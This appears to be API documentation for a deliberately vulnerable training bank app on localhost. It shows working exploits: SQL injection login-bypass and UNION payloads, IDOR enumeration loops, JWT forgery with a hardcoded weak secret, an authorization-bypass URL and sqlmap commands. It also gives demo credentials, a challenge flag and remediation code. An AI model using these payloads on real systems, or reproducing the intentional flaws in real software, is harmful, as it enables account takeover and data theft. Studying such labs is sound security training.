# 🔧 Razz Bank API Documentation

## Overview

The Razz Bank Training Platform provides a comprehensive RESTful API designed for cybersecurity education and penetration testing practice. The API demonstrates various security vulnerabilities including SQL injection, IDOR, JWT authentication bypass, and authorization bypass vulnerabilities.

⚠️ **Educational Purpose Only**: This API contains intentional security vulnerabilities for training purposes.

## Base URL

```
http://localhost:5000
```

## Authentication

The API supports dual authentication methods:

1. **Session-based authentication** (traditional web login)
2. **JWT authentication** (API access)

### JWT Authentication Flow

```bash
# 1. Obtain JWT token
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "admin123!@#"}'

# Response:
{
  "success": true,
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "user": {
    "id": 1057,
    "username": "admin",
    "role": "admin",
    "account_number": "ADM001",
    "balance": 999999.99
  }
}

# 2. Use token in subsequent requests
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." \
  http://localhost:5000/api/transactions
```

## API Endpoints

### Authentication Endpoints

#### POST /api/auth/login
Authenticate user and receive JWT token.

**Request:**
```json
{
  "username": "admin",
  "password": "admin123!@#"
}
```

**Response:**
```json
{
  "success": true,
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "user": {
    "id": 1057,
    "username": "admin",
    "email": "admin@razzbank.com",
    "full_name": "System Administrator",
    "account_number": "ADM001",
    "balance": 999999.99,
    "role": "admin"
  }
}
```

#### POST /api/auth/verify
Verify JWT token validity.

**Request:**
```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
}
```

**Response:**
```json
{
  "valid": true,
  "user": {
    "id": 1057,
    "username": "admin",
    "role": "admin"
  }
}
```

### Banking API Endpoints

#### GET /api/status
Get API status and available features.

**Response:**
```json
{
  "api_version": "2.0.0",
  "status": "operational",
  "features": {
    "jwt_auth": true,
    "idor_vulnerabilities": true,
    "sql_injection": true,
    "admin_bypass": true
  },
  "endpoints": {
    "auth": {
      "login": "/api/auth/login",
      "verify": "/api/auth/verify"
    },
    "vulnerabilities": {
      "profile_idor": "/profile/<user_id>",
      "account_idor": "/account/<account_number>/transactions",
      "admin_bypass": "/admin/users?admin=true"
    },
    "banking": {
      "transfer": "/api/transfer",
      "pay_bill": "/api/pay-bill",
      "transactions": "/api/transactions",
      "apply_loan": "/api/apply-loan",
      "account_details": "/api/v1.0/account"
    }
  }
}
```

#### GET /api/transactions
Get user's transaction history. Requires authentication.

**Headers:**
```
Authorization: Bearer <jwt_token>
```

**Response:**
```json
{
  "transactions": [
    {
      "date": "2025-01-07",
      "description": "Payment for services",
      "amount": -500.00,
      "type": "transfer"
    }
  ]
}
```

#### POST /api/transfer
Transfer money between accounts. Requires authentication.

**Request:**
```json
{
  "toAccount": "RB000002",
  "amount": 100.00,
  "description": "Test transfer"
}
```

**Response:**
```json
{
  "success": true,
  "message": "Transfer completed successfully"
}
```

#### POST /api/pay-bill
Pay bills to external payees. Requires authentication.

**Request:**
```json
{
  "payee": "Electric Company",
  "amount": 150.00,
  "payDate": "2025-01-07"
}
```

**Response:**
```json
{
  "success": true,
  "message": "Bill payment scheduled successfully"
}
```

#### POST /api/apply-loan
Submit loan application. Requires authentication.

**Request:**
```json
{
  "loanAmount": 50000,
  "loanPurpose": "home",
  "employmentStatus": "employed",
  "annualIncome": 75000
}
```

**Response:**
```json
{
  "success": true,
  "message": "Loan application submitted successfully"
}
```

#### GET /api/v1.0/account
**🚨 IDOR Vulnerability**: Get detailed account information by account number. No authorization required (intentionally vulnerable for educational purposes).

**Query Parameters:**
- `account_number` (required): The account number to retrieve

**Example:**
```bash
curl "http://localhost:5000/api/v1.0/account?account_number=ADM001"
```

**Response:**
```json
{
  "success": true,
  "account": {
    "id": 1057,
    "username": "admin",
    "email": "admin@razzbank.com",
    "full_name": "System Administrator",
    "account_number": "ADM001",
    "balance": 999999.99,
    "role": "admin",
    "created_at": "2025-01-07 10:30:00",
    "system_message": {
      "type": "security_alert",
      "message": "IDOR vulnerability detected: Unauthorized admin account access",
      "flag": "RAZZ{y0U_H@v3_f()UNd_$QL_!NJ3CT10N}",
      "description": "Main challenge flag"
    }
  },
  "recent_transactions": [
    {
      "date": "2025-01-07 09:15:30",
      "description": "Bill payment to electric",
      "amount": -150.0,
      "from_account": "ADM001",
      "to_account": "ELECTRIC",
      "type": "bill_payment"
    }
  ],
  "security_notice": {
    "vulnerability": "IDOR (Insecure Direct Object Reference)",
    "description": "This endpoint demonstrates an IDOR vulnerability where any user can access any account details without proper authorization",
    "impact": "Unauthorized access to sensitive account information",
    "educational_purpose": true
  },
  "api_version": "1.0",
  "timestamp": "2025-01-07T10:30:15.123456"
}
```

**Error Response:**
```json
{
  "error": "Account not found",
  "account_number": "INVALID001"
}
```

### Vulnerable Endpoints (Educational)

#### GET /profile/<user_id>
**🚨 IDOR Vulnerability**: Access any user's profile without authorization.

**Example:**
```bash
curl http://localhost:5000/profile/1057
```

**Response:**
```json
{
  "id": 1057,
  "username": "admin",
  "email": "admin@razzbank.com",
  "full_name": "System Administrator",
  "account_number": "ADM001",
  "balance": 999999.99,
  "role": "admin"
}
```

#### GET /account/<account_number>/transactions
**🚨 IDOR Vulnerability**: Access any account's transaction history.

**Example:**
```bash
curl http://localhost:5000/account/ADM001/transactions
```

**Response:**
```json
{
  "account_number": "ADM001",
  "transactions": [
    {
      "id": 1,
      "from_account": "ADM001",
      "to_account": "RB000001",
      "amount": 500.00,
      "description": "Initial transfer",
      "date": "2025-01-07",
      "type": "transfer"
    }
  ]
}
```

#### GET /admin/users?admin=true
**🚨 Authorization Bypass**: Access admin data through URL parameter.

**Example:**
```bash
curl "http://localhost:5000/admin/users?admin=true"
```

**Response:**
```json
{
  "users": [
    {
      "id": 1057,
      "username": "admin",
      "email": "admin@razzbank.com",
      "full_name": "System Administrator",
      "account_number": "ADM001",
      "balance": 999999.99,
      "role": "admin"
    }
  ]
}
```

#### GET /api/v1.0/account (IDOR)
**🚨 IDOR Vulnerability**: Access detailed account information without authorization.

**Example:**
```bash
curl "http://localhost:5000/api/v1.0/account?account_number=ADM001"
```

**Features:**
- No authentication required
- Access any account by account number
- Returns sensitive account data and recent transactions
- Special flag exposure for admin accounts
- Professional API design despite intentional vulnerability

### Traditional Web Endpoints

#### POST /login
**🚨 SQL Injection Vulnerability**: Login form vulnerable to SQL injection.

**Vulnerable Payloads:**
```bash
# Authentication bypass
curl -X POST http://localhost:5000/login \
  -d "username=admin' OR '1'='1' --&password=anything"

# Data extraction
curl -X POST http://localhost:5000/login \
  -d "username=admin' UNION SELECT 1,2,3,flag_value,5,6,7,8 FROM system_flags--&password=anything"
```

#### GET /health
Application health check endpoint.

**Response:**
```json
{
  "status": "healthy",
  "timestamp": "2025-01-07T06:19:55.564787",
  "database": "connected",
  "version": "1.0.0"
}
```

## Security Vulnerabilities Demonstration

### 1. SQL Injection

**Location**: `/login` endpoint  
**Type**: Union-based SQL injection  
**Impact**: Authentication bypass, data exfiltration

**Exploitation Examples:**
```sql
-- Authentication bypass
Username: admin' OR '1'='1' --
Password: anything

-- Data extraction (flag retrieval)
Username: admin' UNION SELECT 1,2,3,flag_value,5,6,7,8 FROM system_flags--
Password: anything
```

### 2. Insecure Direct Object Reference (IDOR)

**Endpoints**:
- `/profile/<user_id>` - Access any user's profile
- `/account/<account_number>/transactions` - Access any account's transactions

**Exploitation:**
```bash
# Enumerate user profiles
for i in {1050..1060}; do
  curl -s "http://localhost:5000/profile/$i" | jq -r '.username // empty'
done

# Access account transactions
curl "http://localhost:5000/account/ADM001/transactions"
```

### 3. JWT Authentication Vulnerabilities

**Weakness**: Predictable secret key (`weak_secret_key_2024`)  
**Impact**: Token forgery, session hijacking

**Exploitation:**
```bash
# Decode JWT payload
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMDU3LCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzU3MzEyMTU2LCJpYXQiOjE3NTcyMjU3NTZ9.wovLNQRod8RKf4DAdgNdTXXNKMrtovGwyyypQcsWDAk" | cut -d'.' -f2 | base64 -d

# Forge new token with known secret
python3 -c "
import jwt
payload = {'user_id': 1057, 'username': 'admin', 'role': 'admin'}
token = jwt.encode(payload, 'weak_secret_key_2024', algorithm='HS256')
print(token)
"
```

### 4. Authorization Bypass

**Method**: URL parameter manipulation  
**Impact**: Admin panel access

**Exploitation:**
```bash
# Bypass admin check
curl "http://localhost:5000/admin/users?admin=true"
```

## Error Responses

### Authentication Errors

```json
{
  "error": "Invalid or missing JWT token"
}
```

### Validation Errors

```json
{
  "error": "All fields are required"
}
```

### Authorization Errors

```json
{
  "error": "Access denied - Admin privileges required"
}
```

### Not Found Errors

```json
{
  "error": "User not found"
}
```

## Rate Limiting

Currently, no rate limiting is implemented (vulnerability for educational purposes).

## CORS Policy

CORS is permissive for educational purposes (vulnerability for training).

## Testing Tools

### Automated Testing

```bash
# SQLMap for SQL injection
sqlmap -u "http://localhost:5000/login" --data="username=admin&password=admin" --dbs

# Burp Suite for comprehensive testing
# Import the application into Burp Suite Professional for automated vulnerability scanning

# Custom Python scripts
python3 -c "
import requests
import json

# Test IDOR vulnerability
for user_id in range(1050, 1070):
    r = requests.get(f'http://localhost:5000/profile/{user_id}')
    if r.status_code == 200:
        data = r.json()
        print(f'User {user_id}: {data.get(\"username\", \"unknown\")}')
"
```

### Manual Testing Checklist

- [ ] SQL injection in login form
- [ ] IDOR vulnerability enumeration
- [ ] JWT token analysis and forgery
- [ ] Admin authorization bypass
- [ ] API endpoint discovery
- [ ] Error message information disclosure
- [ ] Session management testing

## Remediation Guidance

### SQL Injection Prevention
```python
# Vulnerable (current implementation)
query = f"SELECT * FROM users WHERE username = '{username}'"
cursor.execute(query)

# Secure (parameterized queries)
query = "SELECT * FROM users WHERE username = ? AND password = ?"
cursor.execute(query, (username, password))
```

### IDOR Prevention
```python
# Add authorization checks
def get_user_profile(user_id):
    if session['user_id'] != user_id and session['role'] != 'admin':
        return jsonify({'error': 'Unauthorized'}), 403
    # ... rest of implementation
```

### JWT Security
```python
# Use strong, rotated secrets
JWT_SECRET = os.environ.get('JWT_SECRET')  # Strong random secret
JWT_ALGORITHM = 'RS256'  # Use asymmetric encryption

# Add additional security claims
payload = {
    'user_id': user_id,
    'username': username,
    'role': role,
    'exp': datetime.utcnow() + timedelta(hours=1),  # Shorter expiration
    'iat': datetime.utcnow(),
    'iss': 'razz-bank',  # Issuer
    'aud': 'razz-bank-api'  # Audience
}
```

### Authorization Security
```python
# Implement proper role-based access control
def require_admin():
    if not session.get('role') == 'admin':
        return jsonify({'error': 'Admin access required'}), 403
```

## Support

For questions about this API documentation or the training platform:

- **GitHub Issues**: Report bugs or request features
- **Documentation**: Refer to the main README.md
- **Community**: Join discussions in GitHub Discussions

---

**⚠️ Legal Disclaimer**: This API is designed for educational and authorized security testing purposes only. Users are responsible for ensuring compliance with applicable laws and regulations.

---

*Last updated: January 7, 2025*